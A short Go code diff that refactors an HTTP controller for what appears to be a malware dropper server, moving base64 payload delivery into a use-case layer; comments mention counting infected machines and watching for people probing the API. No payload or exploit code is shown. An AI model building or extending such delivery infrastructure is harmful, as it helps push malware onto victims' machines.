@@ -1,16 +1,15 @@
 package GetDropper
 
 import (
-	"encoding/base64"
 	"github.com/gin-gonic/gin"
 	"log"
 	input "main/src/api/controllers/GetDropper/io"
-	"main/src/api/shared/io"
+	"main/src/application/useCases/GetDropper"
 	"net/http"
 )
 
 type GetDropperController struct {
-	Payload io.Payload
+	UseCase GetDropper.IGetDropperUseCase
 }
 
 func (controller GetDropperController) Get(c *gin.Context) {
@@ -20,13 +19,17 @@ func (controller GetDropperController) Get(c *gin.Context) {
 
 	if err != nil {
 		log.Printf("incorrect input format: %v", err)
+		// TODO: log if someone is trying to check the api ?
 		return
 	}
 
-	// TODO: insert logic here
-	// TODO: store in db, how many infected machines
+	payloadAsB64, err := controller.UseCase.Execute(payload)
 
-	payloadAsB64 := base64.StdEncoding.EncodeToString(controller.Payload.Bytes)
+	if err != nil {
+		log.Printf("error occurred: %v", err)
+		c.IndentedJSON(http.StatusOK, "")
+		return
+	}
 
 	response := struct {
 		Payload string
